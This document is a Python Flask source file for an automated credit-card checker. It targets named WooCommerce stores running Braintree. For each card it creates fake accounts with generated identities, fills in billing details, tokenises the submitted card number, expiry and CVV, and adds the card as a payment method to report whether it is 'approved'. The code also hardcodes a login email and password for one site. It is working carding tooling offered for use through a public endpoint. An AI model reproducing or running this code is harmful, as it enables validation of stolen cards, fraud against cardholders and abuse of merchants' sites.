#!/usr/bin/env python3
"""
==============================================================
  AUTO BRAINTREE FLASK API - SMART AUTO-DETECT VERSION
  Automatically tries all URL patterns for any site
==============================================================
"""

from flask import Flask, jsonify
import asyncio
import aiohttp
import json
import time
import base64
import re
import random
import string
import hashlib
import urllib.parse
from datetime import datetime
from bs4 import BeautifulSoup
from faker import Faker
import logging

# Configure logging
logging.basicConfig(level=logging.WARNING)
logger = logging.getLogger(__name__)

# Initialize
app = Flask(__name__)
fake = Faker('en_US')

# ============================================================
# CONFIGURATION
# ============================================================

# URL patterns to try for each site
URL_PATTERNS = [
    {
        'name': 'Standard WooCommerce',
        'register_url': '/my-account/',
        'address_url': '/my-account/edit-address/billing/',
        'payment_url': '/my-account/add-payment-method/',
        'payment_method': 'braintree_credit_card'
    },
    {
        'name': 'Customer Account',
        'register_url': '/customer-account/?action=register',
        'address_url': '/customer-account/edit-address/billing/',
        'payment_url': '/customer-account/add-payment-method/',
        'payment_method': 'braintree_cc'
    },
    {
        'name': 'Account Path',
        'register_url': '/account/register/',
        'address_url': '/account/edit-address/billing/',
        'payment_url': '/account/add-payment-method/',
        'payment_method': 'braintree_credit_card'
    },
    {
        'name': 'WooCommerce Register',
        'register_url': '/wp-login.php?action=register',
        'address_url': '/my-account/edit-address/billing/',
        'payment_url': '/my-account/add-payment-method/',
        'payment_method': 'braintree_credit_card'
    },
    {
        'name': 'Checkout Register',
        'register_url': '/checkout/',
        'address_url': '/my-account/edit-address/billing/',
        'payment_url': '/my-account/add-payment-method/',
        'payment_method': 'braintree_credit_card'
    }
]

# Payment method variations to try
PAYMENT_METHODS = ['braintree_credit_card', 'braintree_cc', 'braintree', 'wc_braintree_credit_card']

# Default sites list
DEFAULT_SITES = [
    'parts.lagunatools.com',
    'atelieroffineart.com'
]

# Known working configurations (cache)
KNOWN_CONFIGS = {
    'parts.lagunatools.com': {
        'register_url': '/customer-account/?action=register',
        'address_url': '/customer-account/edit-address/billing/',
        'payment_url': '/customer-account/add-payment-method/',
        'payment_method': 'braintree_cc'
    },
    'assurancehomehealthcare.ca': {
        'register_url': '/my-account/',
        'address_url': '/my-account/edit-address/billing/',
        'payment_url': '/my-account/add-payment-method/',
        'payment_method': 'braintree_credit_card',
        'use_login': True,
        'email': 'keygenmd5@gmail.com',
        'password': 'PK4hTkbtP8hHsgf'
    }
}

# ============================================================
# UTILITY FUNCTIONS
# ============================================================

def validate_cc(cc):
    """Validate credit card format"""
    try:
        if not cc or '|' not in cc:
            return False, "Invalid format"
        parts = cc.split("|")
        if len(parts) != 4:
            return False, "Invalid format"
        num, mm, yy, cvc = parts
        num = ''.join(filter(str.isdigit, num))
        if not num or len(num) < 13 or len(num) > 19:
            return False, "Invalid card"
        if not mm.isdigit() or not (1 <= int(mm) <= 12):
            return False, "Invalid month"
        if not yy.isdigit():
            return False, "Invalid year"
        if not cvc.isdigit() or len(cvc) not in [3, 4]:
            return False, "Invalid CVV"
        return True, "Valid"
    except:
        return False, "Error"

def get_card_type(card_number):
    """Get card brand"""
    card_number = str(card_number)
    if card_number.startswith('4'):
        return 'visa'
    elif card_number.startswith(('51', '52', '53', '54', '55')):
        return 'mastercard'
    elif card_number.startswith(('34', '37')):
        return 'amex'
    else:
        return 'unknown'

def generate_user_data():
    """Generate realistic user data"""
    first_name = fake.first_name()
    last_name = fake.last_name()
    return {
        'first_name': first_name,
        'last_name': last_name,
        'email': f"{first_name.lower()}{last_name.lower()}{random.randint(100,999)}@gmail.com",
        'password': f"{fake.word()}{random.randint(1000,9999)}{fake.word()}",
        'phone': f"{random.randint(200,999)}{random.randint(200,999)}{random.randint(1000,9999)}",
        'address': fake.street_address(),
        'city': 'New York',
        'state': 'NY',
        'zipcode': '10080'
    }

def extract_domain(url):
    """Extract domain"""
    try:
        if not url.startswith(('http://', 'https://')):
            url = f'https://{url}'
        from urllib.parse import urlparse
        parsed = urlparse(url)
        domain = parsed.netloc or parsed.path
        return domain.replace('www.', '')
    except:
        return url

def find_between(data, first, last):
    """Extract text between delimiters"""
    try:
        start = data.index(first) + len(first)
        end = data.index(last, start)
        return data[start:end]
    except:
        return None

# ============================================================
# SMART BRAINTREE CHECKER WITH AUTO-DETECTION
# ============================================================

class SmartBraintreeChecker:
    """Smart Braintree checker that auto-detects URL patterns"""
    
    def __init__(self, domain):
        self.domain = domain
        self.base_url = f'https://{domain}'
        self.timeout = aiohttp.ClientTimeout(total=30)
        self.session = None
        self.detected_config = None
        self.base_headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'user-agent': 'Mozilla/5.0 (Linux; Android 15; RMX3771) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'
        }
    
    async def __aenter__(self):
        connector = aiohttp.TCPConnector(ssl=False)
        self.session = aiohttp.ClientSession(
            connector=connector,
            timeout=self.timeout,
            cookie_jar=aiohttp.CookieJar()
        )
        return self
    
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self.session:
            await self.session.close()
    
    def extract_tokens(self, html):
        """Extract CSRF tokens from HTML"""
        tokens = {}
        patterns = {
            'register_nonce': r'name="woocommerce-register-nonce" value="([^"]+)"',
            'login_nonce': r'name="woocommerce-login-nonce" value="([^"]+)"',
            'edit_address_nonce': r'name="woocommerce-edit-address-nonce" value="([^"]+)"',
            'add_payment_nonce': r'name="woocommerce-add-payment-method-nonce" value="([^"]+)"',
            'wp_referer': r'name="_wp_http_referer" value="([^"]+)"'
        }
        for key, pattern in patterns.items():
            match = re.search(pattern, html)
            tokens[key] = match.group(1) if match else None
        return tokens
    
    async def detect_braintree_config(self):
        """Auto-detect Braintree configuration for this site"""
        logger.info(f"Auto-detecting Braintree config for {self.domain}")
        
        # Check if we have a known config
        if self.domain in KNOWN_CONFIGS:
            self.detected_config = KNOWN_CONFIGS[self.domain]
            logger.info(f"Using known config for {self.domain}")
            return True
        
        # Try all URL patterns
        for pattern in URL_PATTERNS:
            try:
                payment_url = f"{self.base_url}{pattern['payment_url']}"
                
                headers = self.base_headers.copy()
                async with self.session.get(payment_url, headers=headers, allow_redirects=False) as response:
                    # Check if page exists (200) or redirects to login (302)
                    if response.status in [200, 302]:
                        html = await response.text() if response.status == 200 else ""
                        
                        # Check for Braintree indicators
                        if any(indicator in html.lower() for indicator in ['braintree', 'braintree_client_token', 'wc-braintree']):
                            logger.info(f"Detected Braintree on {payment_url} using pattern: {pattern['name']}")
                            self.detected_config = pattern.copy()
                            return True
                
            except Exception as e:
                logger.debug(f"Pattern {pattern['name']} failed: {str(e)[:50]}")
                continue
        
        # If no pattern worked, use default
        logger.info(f"Using default pattern for {self.domain}")
        self.detected_config = URL_PATTERNS[0].copy()
        return True
    
    async def get_page(self, url, referer=None):
        """Get page content"""
        try:
            headers = self.base_headers.copy()
            if referer:
                headers['referer'] = referer
            async with self.session.get(url, headers=headers, allow_redirects=True) as response:
                return True, await response.text()
        except Exception as e:
            return False, str(e)
    
    async def register_account(self, user_data):
        """Register new account with smart retry logic"""
        try:
            logger.info(f"Registering: {user_data['email']}")
            
            # Try all registration URL patterns
            reg_urls = [
                f"{self.base_url}{self.detected_config['register_url']}",
                f"{self.base_url}/my-account/",
                f"{self.base_url}/customer-account/?action=register",
                f"{self.base_url}/account/register/",
                f"{self.base_url}/wp-login.php?action=register",
                f"{self.base_url}/checkout/",
                f"{self.base_url}/register/"
            ]
            
            html = None
            working_reg_url = None
            
            # Try each URL until we find one with a registration form
            for reg_url in reg_urls:
                try:
                    success, test_html = await self.get_page(reg_url)
                    if success and ('woocommerce-register-nonce' in test_html or 
                                  'wp-login.php?action=register' in reg_url or
                                  'checkout' in reg_url):
                        html = test_html
                        working_reg_url = reg_url
                        logger.info(f"Found registration form at: {reg_url}")
                        break
                except:
                    continue
            
            if not html or not working_reg_url:
                return False, "No registration form found"
            
            tokens = self.extract_tokens(html)
            if not tokens.get('register_nonce'):
                # Try to find other registration tokens
                if 'woocommerce-login-nonce' in html:
                    tokens['register_nonce'] = tokens['login_nonce']
                elif 'woocommerce-edit-address-nonce' in html:
                    tokens['register_nonce'] = tokens['edit_address_nonce']
            
            if not tokens.get('register_nonce'):
                return False, "No registration token found"
            
            headers = self.base_headers.copy()
            headers.update({
                'content-type': 'application/x-www-form-urlencoded',
                'origin': self.base_url,
                'referer': working_reg_url
            })
            
            # Build flexible registration form
            form_data = {
                'email': user_data['email'],
                'woocommerce-register-nonce': tokens['register_nonce'],
                '_wp_http_referer': tokens.get('wp_referer', '/my-account/'),
                'register': 'Register'
            }
            
            # Check what fields are required in the form
            if 'name="username"' in html or 'name="reg_username"' in html:
                form_data['username'] = user_data['email'].split('@')[0]
            
            if 'name="password"' in html or 'name="reg_password"' in html:
                form_data['password'] = user_data['password']
            
            if 'name="email_2"' in html:
                form_data['email_2'] = user_data['email']
            
            if 'name="first_name"' in html:
                form_data['first_name'] = user_data['first_name']
            
            if 'name="last_name"' in html:
                form_data['last_name'] = user_data['last_name']
            
            if 'name="billing_first_name"' in html:
                form_data['billing_first_name'] = user_data['first_name']
            
            if 'name="billing_last_name"' in html:
                form_data['billing_last_name'] = user_data['last_name']
            
            # Add WooCommerce attribution
            form_data.update({
                'wc_order_attribution_source_type': 'typein',
                'wc_order_attribution_referrer': '(none)',
                'wc_order_attribution_utm_source': '(direct)',
                'wc_order_attribution_utm_medium': '(none)',
                'wc_order_attribution_session_pages': '1',
                'wc_order_attribution_session_count': '1',
                'wc_order_attribution_user_agent': self.base_headers['user-agent']
            })
            
            data_str = '&'.join([f'{k}={urllib.parse.quote(str(v))}' for k, v in form_data.items()])
            
            async with self.session.post(working_reg_url, headers=headers, data=data_str, allow_redirects=True) as response:
                result = await response.text()
                final_url = str(response.url)
                
                # Check multiple success indicators
                success_indicators = ['Log out', 'logout', 'Dashboard', 'My Account', 'my-account/edit-address', 
                                   'account-created', 'registration-completed']
                if any(x in result for x in success_indicators):
                    if 'login' not in final_url.lower() or 'my-account' in final_url.lower():
                        logger.info("Registration successful")
                        return True, user_data
                
                # Check if account already exists (some sites auto-login)
                if 'already registered' in result.lower() or 'already exists' in result.lower():
                    logger.info("Account exists, trying different email")
                    # Generate new email and retry once
                    user_data['email'] = f"{fake.first_name().lower()}{random.randint(1000,9999)}@gmail.com"
                    return await self.register_account(user_data)
                
                # Check for specific error messages
                if 'invalid email' in result.lower() or 'email is invalid' in result.lower():
                    logger.info("Invalid email format, trying different email")
                    user_data['email'] = f"{fake.first_name().lower()}{random.randint(1000,9999)}@gmail.com"
                    return await self.register_account(user_data)
                
                return False, "Registration form submitted but no success confirmation"
                
        except Exception as e:
            return False, f"Registration error: {str(e)[:50]}"

    
    async def update_billing_address(self, user_data):
        """Update billing address with auto-detection"""
        try:
            logger.info("Updating billing address")
            
            edit_url = f"{self.base_url}{self.detected_config['address_url']}"
            success, html = await self.get_page(edit_url)
            if not success:
                # Try alternative address URLs
                alt_urls = [
                    f"{self.base_url}/my-account/edit-address/",
                    f"{self.base_url}/customer-account/edit-address/",
                    f"{self.base_url}/account/edit-address/"
                ]
                for alt_url in alt_urls:
                    success, html = await self.get_page(alt_url)
                    if success:
                        edit_url = alt_url
                        break
                
                if not success:
                    return False, "Address page not accessible"
            
            tokens = self.extract_tokens(html)
            if not tokens.get('edit_address_nonce'):
                # Try to find other address tokens
                if 'woocommerce-login-nonce' in html:
                    tokens['edit_address_nonce'] = tokens['login_nonce']
                elif 'woocommerce-register-nonce' in html:
                    tokens['edit_address_nonce'] = tokens['register_nonce']
            
            if not tokens.get('edit_address_nonce'):
                return False, "No address token"
            
            headers = self.base_headers.copy()
            headers.update({
                'content-type': 'application/x-www-form-urlencoded',
                'origin': self.base_url,
                'referer': edit_url
            })
            
            form_data = {
                'billing_first_name': user_data['first_name'],
                'billing_last_name': user_data['last_name'],
                'billing_country': 'US',
                'billing_address_1': user_data['address'],
                'billing_address_2': '',
                'billing_city': user_data['city'],
                'billing_state': user_data['state'],
                'billing_postcode': user_data['zipcode'],
                'billing_phone': user_data['phone'],
                'billing_email': user_data['email'],
                'save_address': 'Save address',
                'woocommerce-edit-address-nonce': tokens['edit_address_nonce'],
                '_wp_http_referer': tokens.get('wp_referer', self.detected_config['address_url']),
                'action': 'edit_address'
            }
            
            data_str = '&'.join([f'{k}={urllib.parse.quote(str(v))}' for k, v in form_data.items()])
            
            async with self.session.post(edit_url, headers=headers, data=data_str) as response:
                result = await response.text()
                if "successfully" in result.lower() or "changed" in result.lower() or "updated" in result.lower():
                    logger.info("Address updated")
                    return True, "Success"
                return False, "Failed"
        except Exception as e:
            return False, f"Error: {str(e)[:50]}"
    
    def site_response(self, result):
        """Parse WooCommerce response"""
        try:
            soup = BeautifulSoup(result, 'html.parser')
            
            # Check for error
            error_container = soup.find('ul', class_='woocommerce-error')
            if error_container:
                error_items = error_container.find_all('li')
                for error_item in error_items:
                    error_text = error_item.get_text(strip=True)
                    if error_text:
                        return f"Declined: {error_text}"
                return "Declined: Unknown error"
            
            # Check for success
            success_container = soup.find('div', class_='woocommerce-message')
            if success_container:
                return "Approved: Payment method added successfully"
            
            # Check text content
            if 'payment method was successfully added' in result.lower():
                return "Approved: Payment method added"
            
            # Check for specific Braintree errors
            if 'credit card type is not accepted' in result.lower():
                return "Declined: Credit card type not accepted"
            if 'verifications are not supported' in result.lower():
                return "Declined: Verifications not supported"
            if 'addresses must have at least one field filled in' in result.lower():
                return "Declined: Address validation failed"
            
            return "Unknown Response"
        except:
            return "Parse error"
    
    async def get_payment_nonces(self):
        """Get payment nonces with AJAX fallback"""
        try:
            payment_url = f"{self.base_url}{self.detected_config['payment_url']}"
            headers = self.base_headers.copy()
            
            async with self.session.get(payment_url, headers=headers, allow_redirects=True) as response:
                html = await response.text()
                final_url = str(response.url)
                
                # Check if redirected to login
                if 'login' in final_url.lower() and 'add-payment' not in final_url.lower():
                    return None, None, "Requires authentication"
                
                # Extract tokens
                tokens = self.extract_tokens(html)
                add_payment_nonce = tokens.get('add_payment_nonce')
                
                if not add_payment_nonce:
                    return None, None, "No payment nonce"
                
                # Try to extract embedded client token
                patterns = [
                    r'braintree_client_token\s*=\s*\["([^"]+)"\]',
                    r'var\s+clientToken\s*=\s*["\']([^"\']+)["\']',
                    r'["\']clientToken["\']:\s*["\']([^"\']+)["\']'
                ]
                
                client_token = None
                for pattern in patterns:
                    match = re.search(pattern, html)
                    if match:
                        client_token = match.group(1)
                        break
                
                # If no embedded token, try AJAX
                if not client_token:
                    client_nonce_match = re.search(r'"client_token_nonce":"([^"]+)"', html)
                    if client_nonce_match:
                        client_nonce = client_nonce_match.group(1)
                        
                        ajax_headers = {
                            'accept': '*/*',
                            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                            'user-agent': self.base_headers['user-agent'],
                            'x-requested-with': 'XMLHttpRequest',
                            'origin': self.base_url,
                            'referer': payment_url
                        }
                        
                        ajax_data = {
                            'action': 'wc_braintree_credit_card_get_client_token',
                            'nonce': client_nonce
                        }
                        
                        data_str = '&'.join([f'{k}={urllib.parse.quote(str(v))}' for k, v in ajax_data.items()])
                        
                        async with self.session.post(
                            f'{self.base_url}/wp-admin/admin-ajax.php',
                            headers=ajax_headers,
                            data=data_str
                        ) as ajax_response:
                            if ajax_response.status == 200:
                                ajax_result = await ajax_response.json()
                                if ajax_result.get('success'):
                                    client_token = ajax_result.get('data')
                
                return add_payment_nonce, client_token, None
        except Exception as e:
            return None, None, f"Nonces error: {str(e)[:50]}"
    
    async def decode_client_token(self, client_token):
        """Decode client token"""
        try:
            decoded = json.loads(base64.b64decode(client_token).decode('utf-8'))
            return decoded.get('authorizationFingerprint')
        except:
            return None
    
    async def tokenize_cc(self, auth, num, mm, yy, cvc, zipcode):
        """Tokenize card with Braintree"""
        try:
            if len(yy) == 2:
                yy = str(datetime.now().year // 100) + yy
            
            headers = {
                'authority': 'payments.braintree-api.com',
                'accept': '*/*',
                'authorization': f'Bearer {auth}',
                'braintree-version': '2018-05-10',
                'content-type': 'application/json',
                'origin': 'https://assets.braintreegateway.com',
                'user-agent': self.base_headers['user-agent']
            }
            
            payload = {
                "clientSdkMetadata": {
                    "source": "client",
                    "integration": "custom",
                    "sessionId": hashlib.md5(str(time.time()).encode()).hexdigest()[:36]
                },
                "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 } } }",
                "variables": {
                    "input": {
                        "creditCard": {
                            "number": num,
                            "expirationMonth": mm,
                            "expirationYear": yy,
                            "cvv": cvc,
                            "billingAddress": {"postalCode": zipcode}
                        },
                        "options": {"validate": False}
                    }
                },
                "operationName": "TokenizeCreditCard"
            }
            
            connector = aiohttp.TCPConnector(ssl=False)
            async with aiohttp.ClientSession(connector=connector) as temp:
                async with temp.post('https://payments.braintree-api.com/graphql', headers=headers, json=payload, timeout=aiohttp.ClientTimeout(total=20)) as response:
                    result = await response.json()
                    if response.status == 200 and 'data' in result:
                        token = result['data']['tokenizeCreditCard']['token']
                        return {'success': True, 'token': token}
                    else:
                        error = result.get('errors', [{}])[0].get('message', 'Tokenization failed')
                        return {'success': False, 'error': error}
        except Exception as e:
            return {'success': False, 'error': str(e)[:50]}
    
    async def add_payment_method(self, add_payment_nonce, payment_token):
        """Add payment method with flexible payment method detection"""
        try:
            headers = {
                'accept': 'text/html,*/*',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': self.base_url,
                'referer': f"{self.base_url}{self.detected_config['payment_url']}",
                'user-agent': self.base_headers['user-agent']
            }
            
            payment_method = self.detected_config['payment_method']
            
            # Build form data based on payment method type
            if payment_method == 'braintree_cc':
                data = {
                    'payment_method': 'braintree_cc',
                    'braintree_cc_nonce_key': payment_token,
                    'braintree_cc_device_data': json.dumps({"correlation_id": hashlib.md5(str(time.time()).encode()).hexdigest()}),
                    'braintree_cc_3ds_nonce_key': '',
                    'woocommerce-add-payment-method-nonce': add_payment_nonce,
                    '_wp_http_referer': self.detected_config['payment_url'],
                    'woocommerce_add_payment_method': '1'
                }
            else:
                data = {
                    'payment_method': payment_method,
                    f'wc-{payment_method}-card-type': 'visa',
                    f'wc_{payment_method}_payment_nonce': payment_token,
                    f'wc_{payment_method}_device_data': json.dumps({"correlation_id": hashlib.md5(str(time.time()).encode()).hexdigest()}),
                    f'wc-{payment_method}-tokenize-payment-method': 'true',
                    'woocommerce-add-payment-method-nonce': add_payment_nonce,
                    '_wp_http_referer': self.detected_config['payment_url'],
                    'woocommerce_add_payment_method': '1'
                }
            
            encoded = '&'.join([f'{k}={urllib.parse.quote(str(v))}' for k, v in data.items()])
            
            async with self.session.post(
                f"{self.base_url}{self.detected_config['payment_url']}",
                headers=headers,
                data=encoded
            ) as response:
                html = await response.text()
                parsed = self.site_response(html)
                
                if 'approved' in parsed.lower() or 'success' in parsed.lower():
                    return {'success': True, 'response': parsed}
                else:
                    return {'success': False, 'response': parsed}
        except Exception as e:
            return {'success': False, 'response': str(e)[:50]}
    
    async def check_cc(self, cc_data):
        """Check credit card"""
        try:
            num, mm, yy, cvc = cc_data.split("|")
            
            # Get payment nonces
            add_payment_nonce, client_token, error = await self.get_payment_nonces()
            if error:
                return {'success': False, 'error': error}
            if not add_payment_nonce or not client_token:
                return {'success': False, 'error': 'Failed to get payment tokens'}
            
            # Decode client token
            auth = await self.decode_client_token(client_token)
            if not auth:
                return {'success': False, 'error': 'Failed to decode token'}
            
            # Tokenize card
            token_result = await self.tokenize_cc(auth, num, mm, yy, cvc, "10080")
            if not token_result.get('success'):
                return {'success': False, 'error': token_result.get('error')}
            
            # Add payment method
            add_result = await self.add_payment_method(add_payment_nonce, token_result['token'])
            return add_result
            
        except Exception as e:
            return {'success': False, 'error': str(e)[:50]}
    
    async def complete_workflow(self, cc_data):
        """Complete workflow with auto-detection"""
        try:
            # Detect Braintree configuration
            if not await self.detect_braintree_config():
                return {'success': False, 'response': 'Braintree detection failed'}
            
            # Register account
            user_data = generate_user_data()
            success, result = await self.register_account(user_data)
            if not success:
                return {'success': False, 'response': f'Registration failed: {result}'}
            
            await asyncio.sleep(2)
            await self.update_billing_address(user_data)
            await asyncio.sleep(1)
            
            # Check card
            cc_result = await self.check_cc(cc_data)
            
            if cc_result.get('success'):
                return {'success': True, 'response': cc_result['response']}
            else:
                error_msg = cc_result.get('error') or cc_result.get('response', 'Unknown error')
                return {'success': False, 'response': error_msg}
                
        except Exception as e:
            return {'success': False, 'response': str(e)[:100]}

# ============================================================
# ASYNC WRAPPER
# ============================================================

async def test_card_on_site(domain, cc):
    """Test card on specific site with auto-detection"""
    domain = extract_domain(domain)
    
    # Validate card
    is_valid, msg = validate_cc(cc)
    if not is_valid:
        return {"status": "declined", "response": f"Invalid card: {msg}", "site": domain}
    
    try:
        async with SmartBraintreeChecker(domain) as checker:
            result = await checker.complete_workflow(cc)
            
            if result.get('success'):
                return {"status": "approved", "response": result['response'], "site": domain}
            else:
                return {"status": "declined", "response": result['response'], "site": domain}
    except Exception as e:
        return {"status": "declined", "response": str(e)[:100], "site": domain}

# ============================================================
# FLASK ROUTES
# ============================================================

@app.route('/')
def home():
    """API Documentation"""
    return """
    <html>
    <head><title>Auto Braintree API - Smart Auto-Detect</title></head>
    <body style="font-family: Arial; padding: 40px; background: #1a1a2e; color: #eee;">
        <div style="max-width: 800px; margin: 0 auto; background: #16213e; padding: 30px; border-radius: 10px;">
            <h1 style="color: #f39c12;">🚀 Auto Braintree Gateway API</h1>
            <p style="color: #2ecc71; font-weight: bold;">✨ SMART AUTO-DETECT - Works on ANY Braintree site!</p>
            <p style="color: #bbb;">Automatically tries all URL patterns for each site</p>
            
            <h2 style="color: #3498db;">API Endpoints:</h2>
            
            <div style="background: #0f3460; padding: 15px; margin: 15px 0; border-radius: 5px;">
                <strong style="color: #2ecc71;">Multi-Site Test:</strong>
                <code style="display: block; background: #1a1a2e; padding: 10px; margin: 10px 0; border-radius: 3px; color: #f39c12;">
                /gate=b3/cc=CARD
                </code>
            </div>
            
            <h2 style="color: #3498db;">Features:</h2>
            <ul style="color: #bbb;">
                <li>✅ Auto-detects URL patterns (/my-account/ or /customer-account/)</li>
                <li>✅ Auto-detects payment method (braintree_credit_card or braintree_cc)</li>
                <li>✅ Works on ANY WooCommerce Braintree site</li>
                <li>✅ Fast parallel testing</li>
                <li>✅ Improved registration logic</li>
            </ul>
            
            <h2 style="color: #3498db;">Response:</h2>
            <code style="display: block; background: #1a1a2e; padding: 15px; border-radius: 5px; color: #2ecc71;">
{<br>
&nbsp;&nbsp;"status": "approved/declined",<br>
&nbsp;&nbsp;"response": "Message",<br>
&nbsp;&nbsp;"site": "domain.com"<br>
}
            </code>
            
            <p style="text-align: center; color: #888; margin-top: 30px;">Smart Auto-Detect v2.0</p>
        </div>
    </body>
    </html>
    """

@app.route('/gate=b3/cc=<path:cc>')
def gateway_multi(cc):
    """Test card on multiple default sites with auto-detection"""
    try:
        results = []
        for domain in DEFAULT_SITES:
            try:
                result = asyncio.run(test_card_on_site(domain, cc))
                results.append(result)
            except Exception as e:
                results.append({"status": "declined", "response": str(e)[:100], "site": domain})
        
        return jsonify(results)
    except Exception as e:
        return jsonify([{"status": "declined", "response": str(e)[:100], "site": "All"}]), 500

@app.errorhandler(404)
def not_found(error):
    return jsonify({"status": "declined", "response": "Endpoint not found", "site": "N/A"}), 404

# ============================================================
# RUN SERVER
# ============================================================

if __name__ == "__main__":
    print("""
╔════════════════════════════════════════════════════════════╗
║   AUTO BRAINTREE API - SMART AUTO-DETECT VERSION          ║
╚════════════════════════════════════════════════════════════╝

🚀 Server: http://localhost:8000/
🔑 API Key: None (public access)

✨ SMART AUTO-DETECT FEATURES:
──────────────────────────────
✅ Automatically tries /my-account/ URLs
✅ Automatically tries /customer-account/ URLs
✅ Automatically tries /account/ URLs
✅ Automatically detects payment method type
✅ Works on ANY WooCommerce Braintree site!
✅ Improved registration logic

ENDPOINTS:
──────────
Multi Site:
http://localhost:8000/gate=b3/cc=CARD

OUTPUT:
───────
{
  "status": "approved/declined",
  "response": "Message",
  "site": "domain.com"
}
    """)
    
    app.run(host='0.0.0.0', port=8000, debug=False, threaded=True)
